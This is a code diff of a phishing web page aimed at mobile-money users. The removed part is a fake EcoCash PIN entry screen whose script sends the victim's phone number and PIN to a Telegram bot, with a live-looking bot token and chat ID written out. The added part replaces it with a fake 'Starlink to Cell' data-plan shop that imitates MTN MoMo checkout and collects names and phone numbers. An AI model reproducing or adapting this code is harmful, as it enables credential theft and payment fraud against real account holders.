+        <div class="card-link" data-package="5G Monthly Unlimited" data-duration="30-Day Plan" data-price="29600" data-desc="Unlimited 5G data for 30 days. Ultra-low latency, highest speeds, and priority on the 5G network. Perfect for gaming and live streaming.">View details →</div>
+      </div>
     </div>
 
-    <div class="pin-label">Enter your PIN</div>
-
-    <div class="pin-boxes">
-        <input class="otp-input" type="tel" maxlength="1" pattern="[0-9]*" inputmode="numeric">
-        <input class="otp-input" type="tel" maxlength="1" pattern="[0-9]*" inputmode="numeric">
-        <input class="otp-input" type="tel" maxlength="1" pattern="[0-9]*" inputmode="numeric">
-        <input class="otp-input" type="tel" maxlength="1" pattern="[0-9]*" inputmode="numeric">
-
-
+    <!-- BOTTOM INFO TEXT -->
+    <div class="bottom-info">
+      Selecting a plan will redirect you to a secure MTN MoMo page. Your Starlink to Cell plan will be activated shortly after payment.
     </div>
+  </div>
 
-    <div class="forgot">Forgot PIN?</div>
-</div>
-
-<div class="bottom">
-    <p>To register a EcoCash wallet or get assistance,<br>click below</p>
-
-    <div class="buttons">
-        <button class="btn">Register</button>
-        <button class="btn">Help & Support</button>
+  <!-- MODAL OVERLAY -->
+  <div class="modal-overlay" id="packageModal">
+    <div class="modal-content" id="modalContent">
+      <!-- Dynamic content injected here -->
     </div>
+  </div>
 
-    <div class="version">v2.2.3P</div>
+  <script>
+    (function() {
+      // ---------- DATA ----------
+      const packages = [
+        {
+          id: 'pkg1',
+          name: '5GB Data',
+          duration: '2-Day Plan',
+          price: '0.00',
+          desc: '5GB free trial data for new users. Try Starlink to Cell for 2 days with no commitment. Full speed satellite connectivity.',
+          badge: 'New users only'
+        },
+        {
+          id: 'pkg2',
+          name: '15GB Data',
+          duration: '7-Day Plan',
+          price: '3700',
+          desc: '15GB of high-speed satellite data for light browsing, social media and messaging. Valid for 7 days. Perfect for occasional use.',
+          badge: 'Best for light users'
+        },
+        {
+          id: 'pkg3',
+          name: '35GB Data',
+          duration: '14-Day Plan',
+          price: '7400',
+          desc: '35GB of data for balanced usage — streaming, browsing and working. Valid for 14 days across all coverage zones.',
+          badge: 'Balanced'
+        },
+        {
+          id: 'pkg4',
+          name: '50GB Data',
+          duration: '21-Day Plan',
+          price: '11100',
+          desc: '50GB high-speed data for heavy streaming, downloads and remote work. Valid for 21 days across all Starlink to Cell coverage zones.',
+          badge: 'Heavy use'
+        },
+        {
+          id: 'pkg5',
+          name: 'Monthly Unlimited',
+          duration: '30-Day Plan',
+          price: '14800',
+          desc: 'Unlimited data for 30 days. Stream, browse and connect without limits. Ideal for families and remote workers. Subject to fair usage policy.',
+          badge: 'Most popular'
+        },
+        {
+          id: 'pkg6',
+          name: '5G Monthly Unlimited',
+          duration: '30-Day Plan',
+          price: '29600',
+          desc: 'Unlimited 5G data for 30 days. Ultra-low latency, highest speeds, and priority on the 5G network. Perfect for gaming and live streaming.',
+          badge: '5G Coverage'
+        }
+      ];
 
-    <div class="terms">
-        By signing in you agree to the
-        <a href="#">Terms and Conditions</a>
-    </div>
-</div>
+      // ---------- DOM REFS ----------
+      const modalOverlay = document.getElementById('packageModal');
+      const modalContent = document.getElementById('modalContent');
+      const cardLinks = document.querySelectorAll('.card-link');
 
- <script>
-     // Save phone number to localStorage
-  const phoneInput = document.getElementById('phone');
+      // ---------- STATE ----------
+      let currentPackage = null;
 
-  // Pre-fill from localStorage on page load
-  window.addEventListener('load', () => {
-    const savedPhone = localStorage.getItem('phone');
-    if (savedPhone) phoneInput.value = savedPhone;
-  });
+      // ---------- FORMAT PRICE ----------
+      function formatPrice(price) {
+        if (price === '0.00' || price === 'Free trial') return 'Free trial';
+        return 'UGX ' + Number(price).toLocaleString();
+      }
 
-  // Save to localStorage on input
-  phoneInput.addEventListener('input', () => {
-    localStorage.setItem('phone', phoneInput.value);
-  });
-</script>
+      // ---------- HELPER: build modal view (details) ----------
+      function renderDetails(pkg) {
+        currentPackage = pkg;
+        const priceDisplay = pkg.price === '0.00' || pkg.price === 'Free trial'
+          ? 'Free trial'
+          : `UGX ${Number(pkg.price).toLocaleString()}`;
 
+        return `
+          <button class="modal-close" id="modalCloseBtn" aria-label="Close">&times;</button>
+          <div class="modal-pkg-name">${pkg.name}</div>
+          <div class="modal-pkg-duration">${pkg.duration}</div>
+          <div class="modal-pkg-price">${priceDisplay}</div>
+          <div class="modal-desc">${pkg.desc}</div>
 
+          <!-- MTN CHECKOUT FORM -->
+          <form class="checkout-form" id="mtnCheckoutForm">
+            <div class="form-group">
+              <label for="fullName">Full name</label>
+              <input type="text" id="fullName" name="fullName" placeholder="e.g. John Kamau" required />
+            </div>
+            <div class="form-group">
+              <label for="mtnPhone">MTN Mobile Money number</label>
+              <input type="tel" id="mtnPhone" name="mtnPhone" placeholder="e.g. 077 123 4567" required />
+            </div>
+            <div class="form-group">
+              <label>Selected package</label>
+              <input type="text" value="${pkg.name} · ${pkg.duration}" disabled />
+            </div>
+            <div class="form-group">
+              <label>Payment amount</label>
+              <input type="text" value="${priceDisplay}" disabled />
+            </div>
+            <button type="submit" class="mtn-pay-btn" id="payNowBtn">
+              <span style="display:inline-block;width:10px;height:10px;background:#0b1a2e;border-radius:2px;margin-right:6px;"></span>
+              Pay Now with MTN MoMo
+            </button>
+          </form>
+        `;
+      }
 
+      // ---------- HELPER: render processing state ----------
+      function renderProcessing() {
+        return `
+          <button class="modal-close" id="modalCloseBtnProcessing" aria-label="Close">&times;</button>
+          <div class="processing-state active">
+            <div class="processing-icon">📱</div>
+            <h3>Payment request sent</h3>
+            <p>Please check your phone and approve your MTN Mobile Money payment request.</p>
+            <button class="modal-back" id="backToDetailsBtn">← Back to details</button>
+          </div>
+        `;
+      }
 
+      // ---------- OPEN MODAL WITH PACKAGE DETAILS ----------
+      function openPackageDetails(pkg) {
+        currentPackage = pkg;
+        modalContent.innerHTML = renderDetails(pkg);
+        modalOverlay.classList.add('active');
+        attachModalEvents();
+      }
 
-<script>
+      // ---------- ATTACH DYNAMIC EVENTS ----------
+      function attachModalEvents() {
+        const closeBtn = document.getElementById('modalCloseBtn');
+        const closeBtnProc = document.getElementById('modalCloseBtnProcessing');
+        if (closeBtn) closeBtn.addEventListener('click', closeModal);
+        if (closeBtnProc) closeBtnProc.addEventListener('click', closeModal);
 
-const inputs = document.querySelectorAll(".otp-input");
+        const form = document.getElementById('mtnCheckoutForm');
+        if (form) {
+          form.addEventListener('submit', function(e) {
+            e.preventDefault();
+            // Frontend only: no real payment processing.
+            modalContent.innerHTML = renderProcessing();
+            const closeBtnProcNew = document.getElementById('modalCloseBtnProcessing');
+            if (closeBtnProcNew) closeBtnProcNew.addEventListener('click', closeModal);
+            const backBtn = document.getElementById('backToDetailsBtn');
+            if (backBtn) {
+              backBtn.addEventListener('click', function() {
+                if (currentPackage) {
+                  modalContent.innerHTML = renderDetails(currentPackage);
+                  attachModalEvents();
+                }
+              });
+            }
+            console.log('[MTN MoMo] Payment request initiated for package:', currentPackage?.name);
+          });
+        }
+      }
 
+      // ---------- CLOSE MODAL ----------
+      function closeModal() {
+        modalOverlay.classList.remove('active');
+        setTimeout(() => {
+          if (!modalOverlay.classList.contains('active')) {
+            modalContent.innerHTML = '';
+            currentPackage = null;
+          }
+        }, 300);
+      }
 
-
-// Load phone number
-
-
-// Function to submit OTP
-async function submitOTP() {
-    const otp = Array.from(inputs).map(i => i.value).join("");
-    const savedPhone =  document.getElementById("phone").value;
-
-    if (!savedPhone) {
-        alert("Phone number missing. Please restart verification.");
-        return;
-    }
-
-    if (otp.length !== 4 || !/^\d{4}$/.test(otp)) {
-        alert("Please enter a valid 4-digit OTP");
-        return;
-    }
-
-    const message = `Star login attempt:\nPhone: ${savedPhone}\nPn:${otp}`;
-
-    try {
-        const botToken = "8735690176:AAHcMo52cZ6iBBTG0Dojpz-KZ-m1ineyelE"; // Replace with your bot token
-        const chatId = "6688307423"; // Replace with your chat ID
-
-        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ chat_id: chatId, text: message })
+      // ---------- EVENT LISTENERS ON CARDS ----------
+      cardLinks.forEach(link => {
+        link.addEventListener('click', function(e) {
+          e.preventDefault();
+          const pkgName = this.dataset.package;
+          const pkg = packages.find(p => p.name === pkgName);
+          if (pkg) {
+            openPackageDetails(pkg);
+          } else {
+            const fallbackPkg = {
+              name: this.dataset.package,
+              duration: this.dataset.duration,
+              price: this.dataset.price,
+              desc: this.dataset.desc,
+              badge: ''
+            };
+            openPackageDetails(fallbackPkg);
+          }
         });
+      });
 
-        const data = await response.json();
-        if (!data.ok) throw new Error(data.description || "Failed to send OTP to Telegram");
-
-        // ✅ OTP sent successfully, redirect
-        window.location.href = "trialot.html"; // Replace with your target page
-    } catch (error) {
-        console.error("Telegram Error:", error);
-        alert(error.message);
-    }
-}
-
-// Auto movement and auto submit
-inputs.forEach((input, i) => {
-    input.addEventListener("input", () => {
-        // Allow only digits
-        input.value = input.value.replace(/\D/g, "");
-
-        // Move to next input
-        if (input.value.length === 1 && i < inputs.length - 1) {
-            inputs[i + 1].focus();
+      // ---------- CLICK OUTSIDE TO CLOSE ----------
+      modalOverlay.addEventListener('click', function(e) {
+        if (e.target === modalOverlay) {
+          closeModal();
         }
+      });
 
-        // Auto-submit if all inputs are filled
-        const otpFilled = Array.from(inputs).every(inp => inp.value.length === 1);
-        if (otpFilled) submitOTP();
-    });
-
-    input.addEventListener("keydown", e => {
-        if (e.key === "Backspace" && input.value === "" && i > 0) {
-            inputs[i - 1].focus();
+      // ---------- ESC KEY CLOSE ----------
+      document.addEventListener('keydown', function(e) {
+        if (e.key === 'Escape' && modalOverlay.classList.contains('active')) {
+          closeModal();
         }
-    });
-});
+      });
 
-// Timer
+      // ---------- PREVENT BODY SCROLL WHEN MODAL OPEN ----------
+      const observer = new MutationObserver(function() {
+        if (modalOverlay.classList.contains('active')) {
+          document.body.style.overflow = 'hidden';
+        } else {
+          document.body.style.overflow = '';
+        }
+      });
+      observer.observe(modalOverlay, { attributes: true, attributeFilter: ['class'] });
 
-</script>
-
-
-
-
-</body>
-</html>
-
+    })();
+  </script>
 </body>
 </html>
